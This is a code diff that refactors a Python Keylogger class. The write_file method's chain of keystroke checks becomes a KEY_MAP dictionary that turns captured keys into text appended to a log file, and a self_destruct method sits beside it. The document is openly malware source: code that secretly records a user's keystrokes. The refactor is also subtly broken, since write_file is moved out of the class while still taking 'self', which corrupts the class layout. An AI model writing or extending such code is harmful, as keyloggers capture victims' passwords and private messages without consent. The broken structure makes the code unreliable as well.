@@ -27,22 +27,26 @@ class Keylogger:
         with open(self.path, "rt") as f:
             return f.read()
 
-    def write_file(self, keys):
-        with open(self.path, "a") as f:
-            for key in keys:
-                k = str(key).replace("'", "")
-                if "backspace" in k:
-                    f.write(" [BACKSPACE] ")
-                elif "enter" in k:
-                    f.write("\n")
-                elif "shift" in k:
-                    f.write(" [SHIFT] ")
-                elif "space" in k:
-                    f.write(" ")
-                elif "caps_lock" in k:
-                    f.write(" [CAPS_LOCK] ")
-                elif "Key" in k:
-                    f.write(k)
+
+KEY_MAP = {
+    "backspace": " [BACKSPACE] ",
+    "enter": "\n",
+    "shift": " [SHIFT] ",
+    "space": " ",
+    "caps_lock": " [CAPS_LOCK] ",
+}
+
+
+def write_file(self, keys):
+    with open(self.path, "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if "Key" in k:
+                k = k[4:]  # remove "Key." prefix
+            if k in KEY_MAP:
+                f.write(KEY_MAP[k])
+            else:
+                f.write(k)
 
     def self_destruct(self):
         self.flag = 1
